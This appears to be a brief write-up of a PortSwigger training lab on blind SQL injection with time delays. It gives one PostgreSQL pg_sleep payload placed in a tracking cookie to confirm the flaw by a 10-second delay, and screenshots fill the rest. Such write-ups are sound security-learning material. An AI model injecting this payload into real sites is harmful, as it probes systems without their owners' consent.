## Lab Description: Blind SQL injection with time delays

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/0f7c9ef4-2d74-4677-9f3e-f1b6890f2901)

## Solution: 
SLEEP command differs for each type of databse, here we find it by trial & error method that it is a POSTgreSQL database

To do this we can use the following payload
```sql
TrackingId=x'||pg_sleep(10)--
```
![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/f2e90582-1d5f-498d-b283-4bbcaa2cb3dc)

We get a response after 10 sec which confirms the SQL injection vulnerability.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/d797d23f-779c-4123-98b2-09438f2c2617)
